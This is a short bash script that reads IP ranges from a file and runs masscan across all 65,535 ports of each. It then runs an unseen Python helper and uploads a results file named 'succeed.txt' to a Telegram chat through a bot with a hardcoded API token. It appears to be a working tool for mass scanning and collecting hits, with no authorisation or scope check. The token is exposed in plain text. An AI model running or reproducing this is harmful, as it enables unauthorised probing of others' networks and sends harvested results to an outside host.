#!/bin/bash

TOKEN='6904748810:AAGK5Mf3RtnmXLFKv6yLKoL03BVx5LJNhnY'
chat_ids=('-1002063655895')
URL="https://api.telegram.org/bot${TOKEN}"

send_message() {
    local message="$1"
    for chat_id in "${chat_ids[@]}"; do
        curl -s -X POST "${URL}/sendMessage" -d "chat_id=${chat_id}" -d "text=${message}" > /dev/null
    done
}

send_file() {
    local file_path='succeed.txt'
    if [ -f "$file_path" ]; then
        beijing_time=$(TZ="Asia/Shanghai" date '+%Y.%m.%d_%H:%M')
        new_file_name="${beijing_time}.txt"
        mv "${file_path}" "${new_file_name}"
        for chat_id in "${chat_ids[@]}"; do
            curl -s -F "chat_id=${chat_id}" -F "document=@${new_file_name}" "${URL}/sendDocument" > /dev/null
        done
        rm "${new_file_name}"
    else
        send_message "None"
    fi
}

scan_and_send() {
    echo "Reading IP addresses from ipcird.txt..."
    while IFS= read -r sbip || [[ -n "$sbip" ]]; do
        echo "Scanning IP: $sbip"
        masscan -p0-65535 "$sbip" --max-rate 2000 -oG results.txt --wait 0
        python3 s.py
    done < ipcird.txt

    echo "Done"
    send_file
}

scan_and_send
